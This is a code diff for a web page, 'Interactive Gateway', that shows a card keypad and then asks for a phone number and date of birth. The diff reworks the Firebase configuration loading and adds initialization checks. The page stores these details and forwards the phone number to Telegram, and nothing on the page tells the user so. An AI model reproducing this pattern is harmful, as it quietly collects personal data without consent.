@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Interactive Gateway</title>
+<!-- Tailwind CSS CDN for styling -->
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
 /* Ensure the body and html take up the full screen */
@@ -47,14 +48,17 @@ color: white;
 </head>
 <body class="bg-black">
 
+<!-- Card Keypad (Visible by default) -->
 <div id="cardKeypad" class="modal-container">
 <div class="w-full max-w-xs bg-black rounded-2xl p-6">
 <h3 id="keypadTitle" class="text-white text-xl text-center font-bold mb-4">Select a Value</h3>
 <div id="selectionContainer" class="grid grid-cols-3 gap-2">
+<!-- Card buttons will be generated here -->
 </div>
 </div>
 </div>
 
+<!-- User Info Modal (Initially Hidden) -->
 <div id="infoModal" class="modal-container hidden">
 <div class="bg-black p-8 rounded-xl max-w-sm w-full m-4">
 <h2 class="text-2xl font-bold mb-6 text-center text-white">Enter Your Details</h2>
@@ -75,19 +79,19 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/fireba
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";
 
 // --- Firebase Configuration ---
-// Menggunakan variabel lingkungan Vercel. Pastikan Anda sudah mensetting ini di Vercel.
-const firebaseConfig = {
-apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
-authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
-projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
-storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
-messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
-appId: import.meta.env.VITE_FIREBASE_APP_ID
-};
+// Mengambil konfigurasi Firebase dari lingkungan Canvas.
+// Ini memperbaiki 'TypeError: undefined is not an object'.
+const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
+// Initialize Firebase.
+let app;
+let database;
+if (Object.keys(firebaseConfig).length > 0) {
+    app = initializeApp(firebaseConfig);
+    database = getDatabase(app);
+} else {
+    console.error("Firebase configuration not found. Please ensure it is provided in the environment.");
+}
 
 // --- Element References ---
 const cardKeypad = document.getElementById('cardKeypad');
@@ -161,7 +165,6 @@ const phone = phoneNumberInput.value;
 const dob = dobInput.value;
 const zodiac = getZodiacSign(dob);
 
-// Menyiapkan data yang akan disimpan ke Firebase
 const userData = {
 phoneNumber: phone,
 dateOfBirth: dob,
@@ -169,15 +172,18 @@ zodiacSign: zodiac,
 timestamp: new Date().toISOString()
 };
 
-try {
-// Menyimpan data ke Firebase Realtime Database di bawah path 'userSubmissions'
-await push(ref(database, 'userSubmissions'), userData);
-console.log("Data berhasil disimpan ke Firebase!");
-} catch (error) {
-console.error("Gagal menyimpan data ke Firebase:", error);
+// Check if Firebase database is initialized before pushing
+if (database) {
+  try {
+    await push(ref(database, 'userSubmissions'), userData);
+    console.log("Data berhasil disimpan ke Firebase!");
+  } catch (error) {
+    console.error("Gagal menyimpan data ke Firebase:", error);
+  }
+} else {
+  console.warn("Firebase database not initialized. Skipping data storage.");
 }
 
-// Lanjutkan dengan mengirim data ke Telegram dan redirect ke Google
 await sendToTelegram(zodiac, phone);
 redirectToGoogle(zodiac);
 }
@@ -191,7 +197,7 @@ cardKeypad.removeEventListener('dblclick', triggerInfoModal);
 }
 }
 
-// --- DYNAMIC KEYPAD LOGIC (NOW FUNCTIONAL) ---
+// --- DYNAMIC KEYPAD LOGIC ---
 function displayRanks() {
 selectionContainer.innerHTML = '';
 selectionContainer.className = 'grid grid-cols-3 gap-2';
@@ -243,7 +249,6 @@ handleZodiacSubmission();
 
 // --- Initial Setup ---
 displayRanks(); // Start with the functional keypad
-
 </script>
 </body>
 </html>
